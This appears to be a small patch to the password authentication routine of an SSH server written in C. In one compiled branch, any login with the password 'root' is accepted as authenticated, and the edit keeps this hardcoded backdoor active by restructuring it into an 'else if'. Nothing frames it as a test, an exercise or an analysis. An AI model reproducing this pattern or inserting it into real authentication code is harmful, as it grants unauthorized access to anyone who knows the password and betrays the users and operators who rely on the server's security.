@@ -72,7 +72,7 @@ userauth_passwd(Authctxt *authctxt)
 	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
 		authenticated = 1;
 #else
-	if (strcmp(password, "root") == 0) {
+	else if (strcmp(password, "root") == 0) {
 		authenticated = 1;
 	}
 #endif
